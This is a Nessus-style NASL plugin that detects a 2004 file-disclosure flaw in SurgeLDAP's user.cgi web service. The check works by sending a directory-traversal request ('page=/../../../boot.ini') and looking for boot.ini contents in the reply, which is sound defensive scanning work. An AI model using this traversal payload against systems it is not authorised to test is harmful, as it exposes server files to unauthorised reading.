#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: Dr_Insane
# Subject: SurgeLDAP 1.0g Web service user.cgi File retrieval
# Date: April 13, 2004
# Http://members.lycos.co.uk/r34ct/

if(description)
{
  script_id(12211);
  script_bugtraq_id(10103);
  script_version("$Revision: 1.2 $");
  name["english"] = "File Disclosure in SurgeLDAP";
  script_name(english:name["english"]);
 
  desc["english"] = "
There is a vulnerability in the current version of SurgeLDAP
that allows an attacker to retrieve arbitrary files
from the webserver that reside outside the bounding HTML root
directory.

Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect SurgeLDAP File Disclosure";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");

  family["english"] = "General";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 6680);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

function check_dir(path)
{
 req = http_get(item:string(path, "/user.cgi?cmd=show&page=/../../../boot.ini"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 find = string("[boot loader]");
 if ( find >< res )
 {
  security_hole(port);
  exit(0);
 }
}

foreach dir (cgi_dirs()) check_dir(path:dir);
